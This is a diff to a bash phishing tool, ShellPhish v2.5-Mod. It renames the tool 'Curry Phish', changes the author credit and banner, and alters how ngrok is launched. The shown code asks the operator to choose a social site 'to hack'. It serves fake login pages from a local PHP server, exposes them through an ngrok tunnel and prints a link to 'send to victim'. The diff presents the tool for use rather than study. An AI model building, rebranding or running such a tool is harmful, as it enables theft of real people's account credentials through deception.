@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# ShellPhish v2.5-Mod
-# Moded by @AbirHasan2005
+# Curry Phish v2.5-Mod
+# Moded by @Shariar Sakib
 
-# Join Telegram Group for help: http://t.me/linux_repo
+# 
 
 
 trap 'printf "\n";stop;exit 1' 2
@@ -69,17 +69,22 @@ banner() {
 loading
 clear
 printf "\n"
-printf "\e[1;92m       __  _             _  _           _               _      \e[0m\n"
-printf "\e[1;92m      / / | | v2.5-MOD  | || | ______  | |     _       | |     \e[0m\n"
-printf "\e[1;92m     / /  | |           | || |(_____ \ | |    (_)      | |     \e[0m\n"
-printf "\e[1;91m     \ \  | |___   ____ | || | _____) )| |___  _   ___ | |___  \e[0m\n"
-printf "\e[1;91m      \ \ | |_  | / _  )| || ||  ____/ | |_  || | /___)| |_  | \e[0m\n"
-printf "\e[1;92m  _____) )| | | |( (/ / | || || |      | | | || ||___ || | | | \e[0m\n"
-printf "\e[1;92m (______/ |_| |_| \____)|_||_||_|      |_| |_||_|(___/ |_| |_| \e[0m\n"
+printf "\e[1;92m  ▗▄▄▖▗▖ ▗▖▗▄▄▖ ▗▄▄▖▗▖  ▗▖
+▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▝▚▞▘ 
+▐▌   ▐▌ ▐▌▐▛▀▚▖▐▛▀▚▖ ▐▌  
+▝▚▄▄▖▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌ ▐▌  
+                         
+                          \e[0m\n"
+printf "\e[1;92m     \e[0m\n"
+printf "\e[1;92m   \e[0m\n"
+printf "\e[1;91m  \e[0m\n"
+printf "\e[1;91m  \e[0m\n"
+printf "\e[1;92m   \e[0m\n"
+printf "\e[1;92m  \e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;94m Phishing Tool Moded by @AbirHasan2005 \e[0m\e[1;93m.:.:.\e[0m\n\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;94m Phishing Tool Moded by @Shariar Sakib \e[0m\e[1;93m.:.:.\e[0m\n\n"
 printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Curry ::\e[0m\n"
 printf " \n"
 printf " \e[36;1m.:. Choose any social site which you want to hack .:.\e[0m\n"
 printf " \n"
@@ -446,7 +451,7 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
 cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
-./ngrok http 5555 > /dev/null 2>&1 &
+ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $link
